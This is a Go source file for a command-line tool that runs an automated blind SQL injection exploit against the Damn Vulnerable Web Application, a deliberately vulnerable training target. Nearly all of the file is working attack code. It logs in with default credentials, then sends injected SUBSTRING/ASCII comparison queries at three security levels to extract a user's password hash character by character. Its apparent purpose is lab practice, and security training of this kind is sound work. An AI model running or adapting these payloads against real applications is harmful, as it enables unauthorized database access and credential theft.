package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"gopkg.in/alecthomas/kingpin.v2"
)

var charset = []byte("0123456789abcdef")

var (
	tokenRe  *regexp.Regexp
	resultRe *regexp.Regexp
)

var (
	cli = kingpin.New("dvwa", "Automated exploits for the Damn Vulnerable Web Application (DVWA).")

	sqliBlind         = cli.Command("sqli-blind", "Run the blind SQL injection exploit to crack a user's password hash.")
	sqliBlindAddr     = sqliBlind.Flag("addr", "Address of the DVWA server.").Required().String()
	sqliBlindMode     = sqliBlind.Flag("mode", "Search mode to use for cracking the password hash.").Default("concurrent").Enum("concurrent", "binary")
	sqliBlindSecurity = sqliBlind.Flag("security", "Security level of the vulnerability to target. Must be one of [low, medium, high].").Default("low").Enum("low", "medium", "high")
	sqliBlindWorkers  = sqliBlind.Flag("workers", "Number of workers to use for concurrent search mode.").Default("10").Int()
	sqliBlindUserID   = sqliBlind.Arg("user-id", "User ID to target. Must be between 1-5.").Required().Enum("1", "2", "3", "4", "5")
)

func init() {
	tokenRe = regexp.MustCompile(`<input type='hidden' name='user_token' value='(?P<token>[a-f0-9]{32})' />`)
	resultRe = regexp.MustCompile(`<pre>(.*)</pre>`)
}

func main() {
	switch kingpin.MustParse(cli.Parse(os.Args[1:])) {
	case sqliBlind.FullCommand():
		cli.FatalIfError(sqliBlindRun(), "sqli-blind")
	}
}

func sqliBlindRun() error {
	guesser, err := NewBlindSQLGuesser(*sqliBlindAddr, *sqliBlindSecurity, *sqliBlindUserID)
	if err != nil {
		return err
	}

	injector := NewInjector(guesser, *sqliBlindWorkers)

	start := time.Now()
	err = injector.Exploit(*sqliBlindMode)
	if err != nil {
		cli.FatalIfError(err, "sqli-blind")
	}
	duration := time.Since(start)

	fmt.Printf("Password of user with ID %s: %s [%d guesses in %v]\n", *sqliBlindUserID, string(injector.password), injector.guesses, duration)
	return nil
}

type BlindSQLInjector struct {
	client    *http.Client
	addr      string
	sessionID string
	workers   int

	password []byte
	guesser  Guesser
	guesses  int

	mu sync.Mutex
	wg sync.WaitGroup
}

func NewInjector(guesser Guesser, workers int) *BlindSQLInjector {
	return &BlindSQLInjector{
		workers:  workers,
		password: make([]byte, 32),
		guesser:  guesser,
	}
}

type BlindAttempt struct {
	position int
	guess    byte
}

func (i *BlindSQLInjector) Exploit(mode string) error {
	switch mode {
	case "concurrent":
		attempts := make(chan BlindAttempt)

		for w := 0; w < i.workers; w++ {
			go func() {
				if err := i.exploitConcurrent(attempts); err != nil {
					cli.FatalIfError(err, "sqli-blind")
				}
			}()
		}

		for pos := range i.password {
			for idx := range charset {
				i.wg.Add(1)
				attempts <- BlindAttempt{position: pos, guess: charset[idx]}
				i.guesses++
			}
		}

		i.wg.Wait()
		close(attempts)

		for pos, value := range i.password {
			if value == 0 {
				return fmt.Errorf("no possible value for password at position %d", pos)
			}
		}

	case "binary":
		for pos := range i.password {
			answer, err := i.exploitBinary(charset, pos)
			if err != nil {
				return err
			}

			i.password[pos] = answer
		}

	default:
		return fmt.Errorf("invalid mode for exploit")
	}

	return nil
}

func (i *BlindSQLInjector) exploitConcurrent(attempts <-chan BlindAttempt) error {
	for attempt := range attempts {
		correct, err := i.guesser.GuessEqual(attempt.position, attempt.guess)
		if err != nil {
			return err
		}

		if correct {
			i.mu.Lock()
			i.password[attempt.position] = attempt.guess
			i.mu.Unlock()
		}

		i.wg.Done()
	}

	return nil
}

func (i *BlindSQLInjector) exploitBinary(possible []byte, position int) (byte, error) {
	i.guesses++
	mid := len(possible) / 2

	if len(possible) == 0 {
		return 0, fmt.Errorf("no possible value for password at position %d", position)
	}

	equal, err := i.guesser.GuessEqual(position, possible[mid])
	if err != nil {
		return 0, err
	}

	more, err := i.guesser.GuessGreater(position, possible[mid])
	if err != nil {
		return 0, err
	}

	switch {
	case equal:
		return possible[mid], nil
	case more:
		return i.exploitBinary(possible[mid+1:], position)
	default:
		return i.exploitBinary(possible[:mid], position)
	}
}

type Guesser interface {
	GuessEqual(position int, char byte) (bool, error)
	GuessGreater(position int, char byte) (bool, error)
}

type BlindSQLGuesser struct {
	client   *http.Client
	addr     string
	security string
	userID   string
}

func NewBlindSQLGuesser(addr, security, userID string) (*BlindSQLGuesser, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	guesser := &BlindSQLGuesser{
		client:   &http.Client{Jar: jar},
		addr:     addr,
		security: security,
		userID:   userID,
	}

	if err := guesser.Login(); err != nil {
		return nil, err
	}

	return guesser, nil
}

func (g *BlindSQLGuesser) Login() error {
	resp, err := g.client.Get(fmt.Sprintf("http://%s/login.php", g.addr))
	if err != nil {
		return err
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	matches := tokenRe.FindSubmatch(body)
	if len(matches) < 2 {
		return fmt.Errorf("could not find a user token on login page")
	}

	data := url.Values{}
	data.Set("username", "admin")
	data.Set("password", "password")
	data.Set("Login", "Login")
	data.Set("user_token", string(matches[1]))

	req, err := http.NewRequest(http.MethodPost, fmt.Sprintf("http://%s/login.php", g.addr), strings.NewReader(data.Encode()))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err = g.client.Do(req)
	if err != nil {
		return err
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to login with status code %d", resp.StatusCode)
	}

	index, err := url.Parse(fmt.Sprintf("http://%s/index.php", g.addr))
	if err != nil {
		return err
	}

	cookies := append(g.client.Jar.Cookies(index), &http.Cookie{Name: "security", Value: g.security})
	g.client.Jar.SetCookies(index, cookies)

	return nil
}

func (g *BlindSQLGuesser) GuessEqual(position int, char byte) (bool, error) {
	return g.guess(position, char, "=")
}

func (g *BlindSQLGuesser) GuessGreater(position int, char byte) (bool, error) {
	return g.guess(position, char, ">")
}

func (g *BlindSQLGuesser) guess(position int, char byte, op string) (bool, error) {
	var resp *http.Response
	var err error
	switch g.security {
	case "low":
		query := fmt.Sprintf("7' OR (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id = %s), %d, 1))) %s %d#", g.userID, position+1, op, char)
		resp, err = g.client.Get(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/?id=%s&Submit=Submit#", g.addr, url.QueryEscape(query)))
		if err != nil {
			return false, err
		}
	case "medium":
		query := fmt.Sprintf("7 OR (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id = %s), %d, 1))) %s %d#", g.userID, position+1, op, char)
		data := url.Values{
			"id":     {query},
			"Submit": {"Submit"},
		}

		resp, err = g.client.PostForm(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/", g.addr), data)
		if err != nil {
			return false, err
		}
	case "high":
		query := fmt.Sprintf("7' OR (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id = %s), %d, 1))) %s %d#", g.userID, position+1, op, char)
		data := url.Values{
			"id":     {query},
			"Submit": {"Submit"},
		}

		resp, err = g.client.PostForm(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/cookie-input.php", g.addr), data)
		if err != nil {
			return false, err
		}

		resp, err = g.client.Get(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/", g.addr))
		if err != nil {
			return false, err
		}
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	matches := resultRe.FindSubmatch(body)
	if len(matches) < 2 {
		return false, fmt.Errorf("could not get exploit result")
	}
	result := string(matches[1])

	switch result {
	case "User ID exists in the database.":
		return true, nil
	case "User ID is MISSING from the database.":
		return false, nil
	default:
		return false, fmt.Errorf("unexpected exploit result: %s", result)
	}
}

type FakeGuesser struct {
	answer string
}

func NewFakeGuesser() *FakeGuesser {
	rand.Seed(time.Now().UnixNano())

	answer := make([]byte, 32)
	for i := range answer {
		answer[i] = charset[rand.Intn(len(charset))]
	}

	return &FakeGuesser{
		answer: string(answer),
	}
}

func (g *FakeGuesser) GuessEqual(position int, char byte) (bool, error) {
	time.Sleep(10 * time.Millisecond)
	return g.answer[position] == char, nil
}

func (g *FakeGuesser) GuessGreater(position int, char byte) (bool, error) {
	time.Sleep(10 * time.Millisecond)
	return g.answer[position] > char, nil
}
